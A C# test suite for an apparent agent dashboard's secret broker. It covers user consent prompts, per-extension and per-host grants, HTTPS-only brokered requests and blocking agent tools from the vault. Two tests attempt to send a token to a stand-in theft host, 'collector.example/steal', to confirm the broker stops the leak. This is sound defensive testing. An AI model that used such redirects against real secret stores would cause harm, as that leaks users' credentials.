using System.Net;
using AgentsDashboard.Core.Repos;
using AgentsDashboard.Core.Secrets;
using AgentsDashboard.Core.Tests.Support;

namespace AgentsDashboard.Core.Tests;

public sealed class SecretBrokerTests : IDisposable
{
    private readonly TempDir _temp = new();
    private readonly MemoryVault _vault = new();
    private readonly FakeClock _clock = new();
    private readonly RecordingHandler _http = new();
    private readonly SecretBroker _broker;

    private static readonly SecretCaller Jira = new("jira", "Jira", "hash-1");
    private static readonly SecretCaller JiraRebuilt = Jira with { Hash = "hash-2" };
    private static readonly SecretCaller Other = new("other", "Other", "hash-9");

    public SecretBrokerTests() => _broker = New();

    private SecretBroker New() => new(new SecretCatalog(new AppPaths(_temp.Path)), _vault, _clock, _http);

    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    public void Dispose()
    {
        _broker.Dispose();
        _temp.Dispose();
    }

    /// <summary>Waits for the broker to put a request up, as the prompt would see it.</summary>
    private async Task<SecretRequest> Prompted(int count = 1)
    {
        for (var i = 0; i < 200 && _broker.Pending.Count < count; i++)
        {
            await Task.Delay(10, Ct);
        }

        Assert.Equal(count, _broker.Pending.Count);
        return _broker.Pending[^1];
    }

    [Fact]
    public async Task A_read_waits_for_the_user_and_then_gets_the_value()
    {
        Assert.Null(_broker.Store("jira", "token"));

        var read = _broker.ReadAsync(Jira, "jira", "to list your tickets", Ct);
        var request = await Prompted();

        Assert.False(read.IsCompleted);
        Assert.Equal("to list your tickets", request.Purpose);
        Assert.Equal(SecretAccess.Read, request.Access);

        Assert.Null(_broker.Allow(request));
        Assert.Equal("token", await read);
        Assert.Empty(_broker.Pending);
    }

    [Fact]
    public async Task Once_allowed_the_same_build_is_answered_without_asking()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await first;

        Assert.Equal("token", await _broker.ReadAsync(Jira, "jira", null, Ct));
        Assert.Empty(_broker.Pending);
    }

    [Fact]
    public async Task A_rebuilt_extension_is_asked_again()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await first;

        var again = _broker.ReadAsync(JiraRebuilt, "jira", null, Ct);
        var request = await Prompted();

        Assert.Equal("hash-2", request.Caller.Hash);
        Assert.False(again.IsCompleted);
    }

    [Fact]
    public async Task A_grant_is_for_one_extension_only()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await first;

        var other = _broker.ReadAsync(Other, "jira", null, Ct);
        Assert.Equal("other", (await Prompted()).Caller.ExtensionId);
        Assert.False(other.IsCompleted);
    }

    [Fact]
    public async Task A_refusal_is_kept_so_a_timer_does_not_ask_again()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Refuse(await Prompted());

        Assert.Null(await first);
        Assert.Null(await _broker.ReadAsync(Jira, "jira", null, Ct));
        Assert.Empty(_broker.Pending);
        Assert.True(_broker.Secrets.Single().Grants.Single().Refused);
    }

    [Fact]
    public async Task Revoking_a_refusal_lets_it_ask_again()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Refuse(await Prompted());
        await first;

        _broker.Revoke("jira", "jira");
        _ = _broker.ReadAsync(Jira, "jira", null, Ct);

        await Prompted();
    }

    [Fact]
    public async Task Not_now_answers_null_and_keeps_nothing()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Dismiss(await Prompted());

        Assert.Null(await first);
        Assert.Empty(_broker.Secrets.Single().Grants);

        _ = _broker.ReadAsync(Jira, "jira", null, Ct);
        await Prompted();
    }

    [Fact]
    public async Task A_port_is_part_of_the_host()
    {
        _broker.Store("build", "tok");
        var placement = new SecretPlacement("Authorization", "Bearer", false);
        using var first = new HttpRequestMessage(HttpMethod.Get, "https://intranet.corp:8443/api");
        var send = _broker.SendAsync(Jira, "build", first, placement, null, Ct);
        var prompt = await Prompted();
        Assert.Equal("intranet.corp:8443", prompt.Host);
        _broker.Allow(prompt);
        (await send)!.Dispose();

        using var other = new HttpRequestMessage(HttpMethod.Get, "https://intranet.corp/api");
        _ = _broker.SendAsync(Jira, "build", other, placement, null, Ct);
        Assert.Equal("intranet.corp", (await Prompted()).Host);
    }

    [Fact]
    public async Task Calls_about_the_same_thing_share_one_prompt()
    {
        _broker.Store("jira", "token");
        var reads = Enumerable.Range(0, 5).Select(i => _broker.ReadAsync(Jira, "jira", $"call {i}", Ct)).ToList();
        var request = await Prompted();

        _broker.Allow(request);

        Assert.All(await Task.WhenAll(reads), v => Assert.Equal("token", v));
    }

    [Fact]
    public async Task A_missing_secret_is_added_from_the_prompt()
    {
        var read = _broker.ReadAsync(Jira, "linear", null, Ct);
        var request = await Prompted();

        Assert.False(_broker.Exists("linear"));
        Assert.NotNull(_broker.Allow(request));
        Assert.Null(_broker.Allow(request, "lin_key"));

        Assert.Equal("lin_key", await read);
        Assert.Equal("lin_key", _vault.Read("linear"));
    }

    [Fact]
    public async Task Refusing_a_missing_secret_answers_null_and_records_nothing()
    {
        var read = _broker.ReadAsync(Jira, "linear", null, Ct);
        _broker.Refuse(await Prompted());

        Assert.Null(await read);
        Assert.Empty(_broker.Secrets);
        Assert.Empty(_broker.Pending);
    }

    [Fact]
    public async Task A_cancelled_caller_stops_waiting_and_the_prompt_stays()
    {
        _broker.Store("jira", "token");
        using var cts = new CancellationTokenSource();
        var read = _broker.ReadAsync(Jira, "jira", null, cts.Token);
        var request = await Prompted();

        await cts.CancelAsync();

        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => read);
        Assert.Same(request, Assert.Single(_broker.Pending));
    }

    [Fact]
    public async Task Grants_and_names_survive_a_restart_and_values_are_not_in_the_file()
    {
        _broker.Store("jira", "token-value");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await first;

        using var again = New();
        Assert.Equal("token-value", await again.ReadAsync(Jira, "jira", null, Ct));

        var file = await File.ReadAllTextAsync(new AppPaths(_temp.Path).SecretsFile, Ct);
        Assert.Contains("\"jira\"", file, StringComparison.Ordinal);
        Assert.DoesNotContain("token-value", file, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Last_used_is_written_at_most_once_a_minute()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await first;
        var at = _clock.Now;

        _clock.Advance(TimeSpan.FromSeconds(30));
        await _broker.ReadAsync(Jira, "jira", null, Ct);
        Assert.Equal(at, _broker.Secrets.Single().Grants.Single().LastUsed);

        _clock.Advance(TimeSpan.FromSeconds(31));
        await _broker.ReadAsync(Jira, "jira", null, Ct);
        Assert.Equal(_clock.Now, _broker.Secrets.Single().Grants.Single().LastUsed);
    }

    [Fact]
    public async Task Deleting_a_secret_removes_the_value_and_every_grant()
    {
        _broker.Store("jira", "token");
        var first = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await first;

        Assert.Null(_broker.Delete("jira"));

        Assert.Null(_vault.Read("jira"));
        Assert.Empty(_broker.Secrets);
    }

    [Fact]
    public async Task A_brokered_request_carries_the_secret_and_the_extension_never_gets_it()
    {
        _broker.Store("github", "ghp_x");
        using var request = new HttpRequestMessage(HttpMethod.Get, "https://api.github.com/user");
        request.Headers.TryAddWithoutValidation("Authorization", "Bearer something-the-extension-put");

        var send = _broker.SendAsync(Jira, "github", request, new SecretPlacement("Authorization", "Bearer", false), null, Ct);
        var prompt = await Prompted();
        Assert.Equal("api.github.com", prompt.Host);
        Assert.Equal(SecretAccess.Brokered, prompt.Access);
        _broker.Allow(prompt);

        using var response = await send;
        Assert.Equal(HttpStatusCode.OK, response!.StatusCode);
        Assert.Equal(["Bearer ghp_x"], _http.Authorizations);
        Assert.Equal(SecretAccess.Brokered, _broker.Secrets.Single().Grants.Single().Access);

        // Brokering does not let it read the value.
        var read = _broker.ReadAsync(Jira, "github", null, Ct);
        await Prompted();
        Assert.False(read.IsCompleted);
    }

    [Fact]
    public async Task The_extension_cannot_read_the_secret_back_off_its_request()
    {
        _broker.Store("github", "ghp_x");
        var request = new HttpRequestMessage(HttpMethod.Get, "https://api.github.com/user");
        request.Headers.TryAddWithoutValidation("X-Own", "kept");
        var send = _broker.SendAsync(Jira, "github", request, new SecretPlacement("Authorization", "Bearer", false), null, Ct);
        _broker.Allow(await Prompted());
        using var response = await send;

        Assert.Null(request.Headers.Authorization);
        Assert.False(request.Headers.Contains("Authorization"));
        Assert.False(response!.RequestMessage?.Headers.Contains("Authorization") ?? false);
        Assert.Equal(["Bearer ghp_x"], _http.Authorizations);
        Assert.Equal(["kept"], _http.Sent.Single().Headers.GetValues("X-Own"));
    }

    [Fact]
    public async Task Changing_the_request_while_the_prompt_is_up_does_not_move_the_secret()
    {
        _broker.Store("github", "ghp_x");
        var request = new HttpRequestMessage(HttpMethod.Get, "https://api.github.com/user");
        var send = _broker.SendAsync(Jira, "github", request, new SecretPlacement("Authorization", "Bearer", false), null, Ct);
        var prompt = await Prompted();

        request.RequestUri = new Uri("https://collector.example/steal");
        request.Headers.Host = "collector.example";
        _broker.Allow(prompt);
        using var response = await send;

        var sent = _http.Sent.Single();
        Assert.Equal("api.github.com", sent.RequestUri!.Host);
        Assert.Null(sent.Headers.Host);
    }

    [Fact]
    public async Task A_brokered_grant_is_per_host()
    {
        _broker.Store("github", "ghp_x");
        using var first = new HttpRequestMessage(HttpMethod.Get, "https://api.github.com/user");
        var send = _broker.SendAsync(Jira, "github", first, new SecretPlacement("Authorization", "Bearer", false), null, Ct);
        _broker.Allow(await Prompted());
        (await send)!.Dispose();

        using var elsewhere = new HttpRequestMessage(HttpMethod.Get, "https://collector.example/steal");
        var leak = _broker.SendAsync(Jira, "github", elsewhere, new SecretPlacement("Authorization", "Bearer", false), null, Ct);
        Assert.Equal("collector.example", (await Prompted()).Host);
        Assert.False(leak.IsCompleted);
        Assert.Single(_http.Authorizations);
    }

    [Fact]
    public async Task Allowing_a_second_host_keeps_the_first()
    {
        _broker.Store("github", "ghp_x");
        var placement = new SecretPlacement("Authorization", "Bearer", false);
        foreach (var url in new[] { "https://api.github.com/a", "https://uploads.github.com/b" })
        {
            using var request = new HttpRequestMessage(HttpMethod.Get, url);
            var send = _broker.SendAsync(Jira, "github", request, placement, null, Ct);
            _broker.Allow(await Prompted());
            (await send)!.Dispose();
        }

        Assert.Equal(["api.github.com", "uploads.github.com"], _broker.Secrets.Single().Grants.Single().Hosts);
    }

    [Fact]
    public async Task A_read_grant_covers_brokered_requests()
    {
        _broker.Store("github", "ghp_x");
        var read = _broker.ReadAsync(Jira, "github", null, Ct);
        _broker.Allow(await Prompted());
        await read;

        using var request = new HttpRequestMessage(HttpMethod.Get, "https://api.github.com/user");
        using var response = await _broker.SendAsync(Jira, "github", request, new SecretPlacement("Authorization", "Bearer", false), null, Ct);

        Assert.NotNull(response);
        Assert.Empty(_broker.Pending);
    }

    [Fact]
    public async Task Allowing_a_brokered_request_never_narrows_a_read_grant()
    {
        _broker.Store("github", "ghp_x");
        var placement = new SecretPlacement("Authorization", "Bearer", false);
        using var request = new HttpRequestMessage(HttpMethod.Get, "https://api.github.com/user");

        // Both asked before either is answered.
        var send = _broker.SendAsync(Jira, "github", request, placement, null, Ct);
        var read = _broker.ReadAsync(Jira, "github", null, Ct);
        await Prompted(2);
        var brokered = _broker.Pending.Single(r => r.Access == SecretAccess.Brokered);
        var reading = _broker.Pending.Single(r => r.Access == SecretAccess.Read);

        _broker.Allow(reading);
        Assert.Equal("ghp_x", await read);
        (await send)!.Dispose();
        _broker.Allow(brokered);

        Assert.Equal(SecretAccess.Read, _broker.Secrets.Single().Grants.Single().Access);
    }

    [Fact]
    public async Task Basic_placement_encodes_the_value()
    {
        _broker.Store("jira", "me@example.com:tok");
        var read = _broker.ReadAsync(Jira, "jira", null, Ct);
        _broker.Allow(await Prompted());
        await read;

        using var request = new HttpRequestMessage(HttpMethod.Get, "https://example.atlassian.net/rest/api/3/myself");
        (await _broker.SendAsync(Jira, "jira", request, new SecretPlacement("Authorization", "Basic", true), null, Ct))!.Dispose();

        Assert.Equal(["Basic bWVAZXhhbXBsZS5jb206dG9r"], _http.Authorizations);
    }

    [Theory]
    [InlineData("http://api.github.com/user")]
    [InlineData("/user")]
    public async Task A_brokered_request_must_be_https(string url)
    {
        using var request = new HttpRequestMessage(HttpMethod.Get, new Uri(url, UriKind.RelativeOrAbsolute));

        await Assert.ThrowsAsync<ArgumentException>(() =>
            _broker.SendAsync(Jira, "github", request, new SecretPlacement("Authorization", "Bearer", false), null, Ct));
        Assert.Empty(_broker.Pending);
    }

    [Fact]
    public async Task Nothing_an_agent_tool_starts_can_ask_for_a_secret()
    {
        _broker.Store("github", "ghp_x");
        var read = _broker.ReadAsync(Jira, "github", null, Ct);
        _broker.Allow(await Prompted());
        await read;

        Task<string?> inside, started;
        using (SecretBroker.ForAgent())
        {
            inside = _broker.ReadAsync(Jira, "github", null, Ct);
            started = Task.Run(() => _broker.ReadAsync(Jira, "github", null, Ct), Ct);
        }

        await Assert.ThrowsAsync<InvalidOperationException>(() => inside);
        await Assert.ThrowsAsync<InvalidOperationException>(() => started);
        Assert.Equal("ghp_x", await _broker.ReadAsync(Jira, "github", null, Ct));
        Assert.Empty(_broker.Pending);
    }

    [Fact]
    public void The_store_itself_refuses_an_agent_reading_or_writing()
    {
        var vault = SecretVaults.Guarded(_vault);
        vault.Write("github", "ghp_x");

        using (SecretBroker.ForAgent())
        {
            Assert.Throws<InvalidOperationException>(() => vault.Read("github"));
            Assert.Throws<InvalidOperationException>(() => vault.Write("github", "replaced"));
            Assert.Throws<InvalidOperationException>(() => vault.Delete("github"));
        }

        Assert.Equal("ghp_x", vault.Read("github"));
    }

    [Theory]
    [InlineData("github", true)]
    [InlineData("jira-cloud.work_2", true)]
    [InlineData("GitHub", false)]
    [InlineData("-lead", false)]
    [InlineData("has space", false)]
    [InlineData("", false)]
    public void Names_are_lower_case_and_plain(string name, bool ok) =>
        Assert.Equal(ok, SecretNames.Problem(name) is null);

    private sealed class RecordingHandler : HttpMessageHandler
    {
        public List<string> Authorizations { get; } = [];

        public List<HttpRequestMessage> Sent { get; } = [];

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            lock (Authorizations)
            {
                Authorizations.AddRange(request.Headers.TryGetValues("Authorization", out var values) ? values : ["(none)"]);
                Sent.Add(request);
            }

            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        }
    }
}

/// <summary>
/// The real OS store. Off unless AGENTS_DASHBOARD_VAULT_TESTS=1: it writes to
/// the login keychain, which in CI may be locked or absent, and on macOS the
/// first run may ask.
/// </summary>
public class SecretVaultTests
{
    [Fact]
    public void Round_trips_a_value_through_this_machines_store()
    {
        if (Environment.GetEnvironmentVariable("AGENTS_DASHBOARD_VAULT_TESTS") != "1")
        {
            Assert.Skip("Set AGENTS_DASHBOARD_VAULT_TESTS=1 to use the OS store.");
        }

        var vault = SecretVaults.ForThisMachine();
        var name = "test-" + Guid.NewGuid().ToString("n")[..8];
        try
        {
            Assert.Null(vault.Read(name));
            vault.Write(name, "first é");
            Assert.Equal("first é", vault.Read(name));
            vault.Write(name, "second");
            Assert.Equal("second", vault.Read(name));
        }
        finally
        {
            vault.Delete(name);
        }

        Assert.Null(vault.Read(name));
        vault.Delete(name);
    }
}
